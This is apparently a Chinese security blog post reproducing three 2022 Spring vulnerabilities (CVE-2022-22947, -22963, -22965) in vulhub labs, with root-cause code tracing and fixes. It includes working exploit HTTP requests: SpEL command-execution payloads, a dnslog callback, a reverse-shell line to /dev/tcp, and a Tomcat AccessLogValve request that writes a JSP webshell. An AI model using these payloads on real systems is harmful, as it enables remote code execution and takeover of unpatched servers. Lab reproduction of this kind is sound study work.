# ~请查收你的-Spring2022系列漏洞大礼包

> 2022以来，spring被爆出来很多漏洞，之前没时间复现，现在来研究复现一番。
>
> (前几天看见某千万抖音大佬模拟电信诈骗，身边的技术人员（装黑客）遍历磁盘文件的操作着实给我看笑了)

 **影响版本：**

 **Spring ** **Cloud**** Gateway**< 3.1.1

 **Spring ** **Cloud**** Gateway**< 3.0.7

 **Spring ** **Cloud**** Gateway**其他已不再更新的版本

## 1\. Spring Cloud Gateway spel 远程代码执行（CVE-2022-22947）

### 1.1 预备工作

> 先来介绍下Spring Cloud Gateway，SpringCloud Gateway 是 Spring Cloud 的一个全新项目，该项目是基于
> Spring 5.0，Spring Boot 2.0 和 Project Reactor 等技术开发的网关，它旨在为微服务架构提供一种简单有效的统一的
> API 路由管理方式。
>
> 说白了一句话，它就是API网关

 **名词概念：**

**网关：**一个网段的出入口

![image-20220403094234006](https://image.3001.net/images/20220521/1653126137_6288b3f9e01e613c71a9f.png!small)

**API网关：**微服务的统一出入口

  * 将所有前端请求发到API网关，又API网关经过负载均衡后发到对应微服务节点或微服务集群节点（不懂什么是微服务和集群的去百度，这两个词语的概念很简单）

![image-20220403095136671](https://image.3001.net/images/20220521/1653126138_6288b3fa5a9598c0b584f.png!small)

* * *

### 1.2 漏洞利用

还是用vulhub靶场来搭建

![image-20220403111017594](https://image.3001.net/images/20220521/1653126138_6288b3faaa9e617a1b6c2.png!small)

  1.  **先添加一个包含恶意SpEL表达式的路由**

    
    
    POST /actuator/gateway/routes/hacktest HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 329
    
    {
      "id": "hacktest",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }
    

![image-20220403123828083](https://image.3001.net/images/20220521/1653126139_6288b3fb0830be31eb6e9.png!small)

  2. **刷新下路由**

    
    
    POST /actuator/gateway/refresh HTTP/1.1
    Host: 162.14.69.165:8080
    Connection: close
    

![image-20220403130019396](https://image.3001.net/images/20220521/1653126139_6288b3fb607b8819c9495.png!small)

注意这里有个坑

因为我们是POST的请求，但是不需要带数据，所以我这里最后一行是有个换行的

![image-20220403130056949](https://image.3001.net/images/20220521/1653126139_6288b3fb93d7992cd7ac8.png!small)

 **假设你没有换行，就会出现下图所示无响应的情况**

![image-20220403130126707](https://image.3001.net/images/20220521/1653126139_6288b3fbd5d9585ef774f.png!small)

  3.  **查看结果**

    
    
    GET /actuator/gateway/routes/hacktest HTTP/1.1
    Host: 192.168.1.251:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Length: 2
    

![image-20220403130211445](https://image.3001.net/images/20220521/1653126140_6288b3fc2007df6f74d43.png!small)

  4. **利用完后删除路由**

    
    
    DELETE /actuator/gateway/routes/hacktest HTTP/1.1
    Host: 192.168.1.251:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    

![image-20220403130259971](https://image.3001.net/images/20220521/1653126140_6288b3fc72fda511228a5.png!small)

  5. **删除完刷新一下**

![image-20220403130400286](https://image.3001.net/images/20220521/1653126140_6288b3fcc9ad6dbda4c98.png!small)

  6.  **确认已被删除**

![image-20220403130442526](https://image.3001.net/images/20220521/1653126141_6288b3fd1b417e58924f6.png!small)

* * *

### 1.3 原理

    
    
    当我们去访问（gateway actuator）路由执行器端点的时候，会对其filters（过滤器）里面的args值进行spel解析
    

我这里用IDEA建了一个maven项目，导包。

    
    
    <dependency>
                <!--引入spring cloud gateway-->
                <groupId>org.springframework.cloud</groupId>
                <artifactId>spring-cloud-starter-gateway</artifactId>
                <version>3.1.0</version>
     </dependency>
    

**全局搜索ShortcutConfigurable这个接口，在getValue方法中用传入的spel表达式解析器去执行了spel表达式。**

![image-20220403203512205](https://image.3001.net/images/20220521/1653126141_6288b3fd6b8065cfd407c.png!small)

**接下来我们就需要弄清，这个entryValue的值从何而来，我们在当前接口中查找getValue（在当前接口中找到最好，没找到再说），看看是哪里执行了这个方法，可以看到它在ShortcutType这个枚举类的normalize方法中，ok，继续查一下normalize在哪里被调用**

![image-20220403204345947](https://image.3001.net/images/20220521/1653126141_6288b3fdb231b06103d94.png!small)

 **当前接口中不存在它的调用，那就全局搜ShortcutType，看看谁用了ShortcutType里面的normalize**

![image-20220403205622936](https://image.3001.net/images/20220521/1653126141_6288b3fdebc300e8230ba.png!small)

![image-20220403210736352](https://image.3001.net/images/20220521/1653126142_6288b3fe435007b0d7d2c.png!small)

 **spel表达式对应的值就是这里的properties，同样看下谁调用了这个方法**

![image-20220403211007878](https://image.3001.net/images/20220521/1653126142_6288b3fe94a172c2f594a.png!small)

 **可以看到在bind方法中存在调用**

![image-20220403211327730](https://image.3001.net/images/20220521/1653126142_6288b3fed6d05665ce7cc.png!small)

 **这样的话证明，在bind调用之前，我们的properties已经赋值。同样去搜索bind，发现存在赋值如下图所示，**

![image-20220403212130097](https://image.3001.net/images/20220521/1653126143_6288b3ff1d706748bd4d7.png!small)

你

 **其实properties方法追踪一下，如下图所示就是this.properties的赋值**

![image-20220403212220778](https://image.3001.net/images/20220521/1653126143_6288b3ff77c816331339b.png!small)

 **刚才图没截全，如下图，赋值是在lookup方法中，所以看下谁调用了lookup**

![image-20220403212533291](https://image.3001.net/images/20220521/1653126143_6288b3ffb990f1a54be45.png!small)

 **发现combinePredicates存在lookup的调用**

![image-20220403212645472](https://image.3001.net/images/20220521/1653126144_6288b4001596e90b30526.png!small)

 **同理，可见值是从routeDefinition里get的**

![image-20220403212804028](https://image.3001.net/images/20220521/1653126144_6288b400777cfe7bf283c.png!small)

 **往上翻看到了，getRoutes方法里调用了convertToRoute**

![image-20220405122640896](https://image.3001.net/images/20220521/1653126144_6288b400b749e45fddd0f.png!small)

 **ok，可以了这时候我们就可以结合官方文档了**

 **可通过如下方式检索特定路线信息**

![image-20220405123251588](https://image.3001.net/images/20220521/1653126145_6288b4010aaf295a94e04.png!small)

 **代码在这里，这里就是入口了**

![image-20220405123445090](https://image.3001.net/images/20220521/1653126145_6288b4016764ddbcde2f4.png!small)

 **所以我们要构造恶意路由，如下图所示，官方已经写得很明白了，用POST构造**

![image-20220405123839457](https://image.3001.net/images/20220521/1653126145_6288b401a4f6df89b17b1.png!small)

 **构造的时候，我们的payload如下图，那么我们恶意spel表达式为什么要写在args的value里呢？**

    
    
    {
      "id": "hacktest",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
        }
      }],
      "uri": "http://example.com"
    }
    

**上边我们追溯到lookup方法的时候注意赋值方法properties的参数**

![image-20220405124457279](https://image.3001.net/images/20220521/1653126146_6288b402111dd80dfb93e.png!small)

* * *

### 1.4 修复

  1. 升版本

  2. 将management.endpoint.gateway.enabled改成false

![image-20220405125441032](https://image.3001.net/images/20220521/1653126146_6288b40258352a265884d.png!small)

* * *

## 2\. Spring Cloud Function functionRouter SPEL代码执行漏洞（CVE-2022-22963）

 **漏洞概述：**

> Spring Cloud Function 是基于Spring Boot
> 的函数计算框架（FaaS），该项目提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的
> FaaS（函数即服务，function as a
> service）平台。它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。
>
> 在版本3.0.0到当前最新版本3.2.2(commit dc5128b)，默认配置下，都存在Spring Cloud Function
> SpEL表达式注入漏洞。

### 2.1 漏洞利用

 **先用vulhub开个靶场**

![image-20220405133514250](https://image.3001.net/images/20220521/1653126146_6288b402a59c45fd15069.png!small)

 **直接在http头文件中加入payload**

    
    
    POST /functionRouter  HTTP/1.1
    Host: 192.168.1.251:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl nnfw3s.dnslog.cn")
    Upgrade-Insecure-Requests: 1
    

![image-20220405134025274](https://image.3001.net/images/20220521/1653126147_6288b40304c942bf55f2d.png!small)

![image-20220405133952439](https://image.3001.net/images/20220521/1653126147_6288b40367327c179d456.png!small)

**反弹shell：**

    
    
    POST /functionRouter  HTTP/1.1
    Host: 192.168.1.251:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash", "-c","bash -i >& /dev/tcp/IP/端口 0>&1"})
    Upgrade-Insecure-Requests: 1
    Content-Length: 2
    

注意：

这里直接用下方命令是不能成功反弹shell的

    
    
    bash -i >& /dev/tcp/IP/端口 0>&1
    

详细看这篇文章

https://wenku.baidu.com/view/9053e9528d9951e79b89680203d8ce2f00666514.html

* * *

### 2.2 漏洞原理

> 漏洞是出在SpringCloud
> Function的RoutingFunction功能上，其功能的⽬的本⾝就是为了微服务应运⽽⽣的，可以直接通过HTTP请求与单个的函数进⾏交互，同时为spring.cloud.function.definition参数提供您要调⽤的函数的名称。

**看一下利用线路，首先springframework\cloud\function\web\mvc\FunctionController.class，将POST请求的body带入到了processRequest函数**

![image-20220405172944346](https://image.3001.net/images/20220521/1653126147_6288b403a0d2149d6edcb.png!small)

**判断请求是否为RoutingFunction，并将请求的内容和Header头编译成Message带入到FunctionInvocationWrapper.apply方法中**

![image-20220405174447209](https://image.3001.net/images/20220521/1653126147_6288b403db8c48bc45b77.png!small)

 **又进入到doApply方法中**

![image-20220405174546674](https://image.3001.net/images/20220521/1653126148_6288b404238543c7e3998.png!small)

 **又被RoutingFunction的apply方法调用**

![image-20220405174614632](https://image.3001.net/images/20220521/1653126148_6288b40457cb89982864d.png!small)

 **进入route方法**

![image-20220405174821695](https://image.3001.net/images/20220521/1653126148_6288b4049d17ac8a545d6.png!small)

 **在这里判断了请求headers头中有没有spring.cloud.function.routing-expression参数，并将结果带入到functionFromExpression()方法中**

![image-20220405174912254](https://image.3001.net/images/20220521/1653126148_6288b404d7ebde7979683.png!small)

 **导致spel解析**

![image-20220405175036700](https://image.3001.net/images/20220521/1653126149_6288b4053abef41847599.png!small)

* * *

### 2.3 修复

  1. 升级Spring Cloud Function至 3.1.7 或 3.2.3 及其以上。

* * *

## 3\. Spring Framework RCE（CVE-2022-22965）

 **介绍:**

`Spring Framework`是一个开源应用框架，初衷是为了降低应用程序开发的复杂度，具有分层体系结构，允许用户选择组件，同时还为`J2EE
`应用程序开发提供了一个好用的框架。当`Spring`部署在`JDK9`及以上版本，远程攻击者可利用该漏洞写入恶意代码导致远程代码执行。

 **利用条件：**

  1. JDK 9 及以上版本环境

  2. Apache Tomcat作为Servlet容器

  3. 打包为WAR

  4. Spring Framework 5.3.X < 5.3.18  
Spring Framework 5.2.X < 5.2.20  
任何引用Spring Framework的衍生产品

* * *

### 3.1 漏洞利用

 **访问**

![image-20220406212406413](https://image.3001.net/images/20220521/1653126149_6288b40587657d376fb27.png!small)

 **构造请求**

post数据

    
    
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22S%22.equals(request.getParameter(%22Tomcat%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=Shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    

header

    
    
    suffix: %>//
    c1: Runtime
    c2: <%
    DNT: 1
    Content-Length: 2
    

**注意这里请求包不唯一，我用的vulhub搭建，它不允许post方法，所以我们可以get方式传参，但是实际情况如果服务器post请求也能接受那么也可以改成post包，这个就得具体问题具体分析了**

注意这个写webshell的步骤不要频繁操作，一次就好（~我陪你到天荒地老~）

![image-20220406214355678](https://image.3001.net/images/20220521/1653126149_6288b405c901111c9d6f8.png!small)

 **利用**

    
    
    http://192.168.1.251:8080/Shell.jsp?Tomcat=S&cmd=whoami
    

![image-20220406214638839](https://image.3001.net/images/20220521/1653126150_6288b406321f8950cd357.png!small)

### 3.2 漏洞原理

> 来吧又到了最折磨的原理部分了
>
> 简答理解就是参数绑定造成的变量覆盖漏洞，漏洞点spring-beans包中。Spring MVC
> 框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，通过 ClassLoader构造恶意请求获取AccessLogValue
> 对象并注入恶意字段值，来更改 Tomcat 服务器的日志记录属性触发 pipeline 机制写入任意路径下的文件。

它就是cve-2010-1622的绕过，如果用过spring mvc或spring boot的对下面这个操作肯定不陌生

    
    
    //User类
    public class User {
    	private String name;
    	public String getName() {
    		return name;
    	}
    	public void setName(String name) {
    		this.name = name;
    	}
    }
    
    
    
    //一个controller
    @Controller
    public class TestController {
    	@RequestMapping("/test")
    	public String execute(User user){
    		System.out.println(user.getName());
    		return "success";
    	}
    }
    

用户访问

    
    
    http://inbreak.net/test?name=xiaoming
    

这个时候会输出xiaoming，前端我们只输入了name而后端因为你接受的类是个User，所以就判断你User里是否有name属性，如果有就将其赋值为xiaoming，而它是怎么判定的呢？是根据是否有name属性的set/get函数来判定的。

 **接下来还要知道Object类是java里面的祖宗类，所有的类都是它的子类，而它里面有个方法叫getClass()**

![image-20220407111936243](https://image.3001.net/images/20220521/1653126150_6288b40684e7ebd726be5.png!small)

 **所以我实例化一个User类并能调用它的getClass方法我能理解，它返回的应该是User的class，但是后边竟然能调用获取类加载器函数**

![image-20220407113920395](https://image.3001.net/images/20220521/1653126150_6288b406c559b670de010.png!small)

 **而我记得只有Class.java才有这个方法，然后我按住ctrl点左键跟进这个方法确实进到了Class.java里**

![image-20220407114010047](https://image.3001.net/images/20220521/1653126151_6288b4070ccf5ee6070a4.png!small)

 **然后我还问了，，无果**

![image-20220407114507573](https://image.3001.net/images/20220521/1653126151_6288b407543c2db92ddfc.png!small)

 **于是找到了这个**

![image-20220407114629989](https://image.3001.net/images/20220521/1653126151_6288b4078ffc006be242d.png!small)

 **当我们执行第一步exp的时候利用过程如下图所示，说白了就是一步步的找到了AccessLogValve**

结合传过来属性路径：
class.module.classLoader.resources.context.parent.pipeline.first.pattern

然后一步步的运用反射来去拿属性对应的值，这个例子的话就是

> 调用HelloWorld的getClass() 拿到Class对象
>
> 通过class对象调用getModule()
>
> 通过Module调用getClassLoader()
>
> 通过ClassLoader拿resources
>
> context是Tomcat的StandardContext
>
> parent拿到的是StandardEngine
>
> pipeline拿到的是StandardPipeline
>
> first拿到的是AccessLogValve

**这个AccessLogValve就是tomcat的日志配置，在Server.xml可以看到，所以说在url里面最终就是修改了下方的值，导致在webapps/ROOT写入了jsp的webshell**

![image-20220407140404315](https://image.3001.net/images/20220521/1653126152_6288b4081e04f53aaf2cd.png!small)

 **接下来我们弄清每一个供我们使用的值**

![image-20220407142457221](https://image.3001.net/images/20220521/1653126152_6288b40877b5a5df77a07.png!small)

名称| 含义  
---|---  
suffix| 后缀  
prefix| 前缀  
directory| 文件写入路径  
fileDateFormat| 允许在访问日志文件名中自定义时间戳。每当格式化的时间戳更改时，文件就会旋转。默认值为`.yyyy-MM-dd`。如果您希望每小时轮换一次，则将此值设置为`.yyyy-MM-dd.HH`。日期格式将始终使用 locale 进行本地化`en_US`。  
pattern| 一种格式布局，用于标识要记录的请求和响应中的各种信息字段，或者选择标准格式的`common`单词`combined`。下边会介绍  
  
**注意这个class.module.classLoader.resources.context.parent.pipeline.first.pattern**

可以看到我们在class后边是module，而我在上方举例，其实可以通过class.getClass.getclassLoader来获取类加载器，不过因为在CVE-2010-1622的时候官方做了黑名单的修复

![image-20220407140843964](https://image.3001.net/images/20220521/1653126152_6288b408cc9f1ee7518bc.png!small)

这个if语句的意思就是，当发现当前的对象是一个Class，然后又在获取其classLoader属性，则直接跳过。这样就断了之间的class.classLoader这条链。

所以当JDK9以后增加了module这个新特性，而module存在getClassLoader()方法。

**又来一个问题，为什么我们第一次发exp的包会生成文件，我们想想我们第一个包干嘛了？说白了修改了tomcat的日志的一些参数值，那么这就是原因了，当我们修改了值就会切换成所修改后的新文件下，再进行日志的记录，那么它为什么会切换呢？**

其实在AccessLogValve还有一个属性，默认就是true，它就是rotatable

![image-20220407143745596](https://image.3001.net/images/20220521/1653126153_6288b4091b832754fd2bd.png!small)

每次记录日志的时候都会执行rotate()方法

![image-20220407143900687](https://image.3001.net/images/20220521/1653126153_6288b4095860278415358.png!small)

而rotate是检查当前的systime 经过format后，与当前的tsDate是否相同。如果日期不同了，自然需要切换日志文件了：

 **举个例子：**

当我们的日志在日期在20220427，会生成20220427.log，但是为什么到20220428的时候就又创建了个20220428.log呢？正是因为这个方法，它检测出来你的AccessLogValve前缀发生改变。

 **好了现在，文件是怎么写入的我们大概弄明白了，还有一个疑问就是headers里面的这些是个什么？**

![image-20220407144148509](https://image.3001.net/images/20220521/1653126153_6288b4099992b3ddb287a.png!small)

 **当我们将exp中的pattern的属性友好的查看的时候，不难发现它就是将其进行了个替换（框多了，DNT不是），为什么要替换？肯定不是闲的没事**

![image-20220407144432868](https://image.3001.net/images/20220521/1653126153_6288b409d536a8ca80718.png!small)

 **其实c1替不替换无所谓了应该就是能绕个检测，主要是suffix和c2它们都存在%，而在pattern里面%是有功能的**

![image-20220407145709329](https://image.3001.net/images/20220521/1653126154_6288b40a2590d20b9ed0a.png!small)

 **所以当我们想在文件内写%就要用%{c2}i的方式从headers获取，这点在官方文档也写的很明白了**

![image-20220407145820887](https://image.3001.net/images/20220521/1653126154_6288b40a88b05e144f749.png!small)

### 3.3 修复

  1. 升版本

  2. 降jdk版本，当然了你降版本的时候千万别搞出别的漏洞（例如log4j）

  3. waf里面配置过滤带class的url

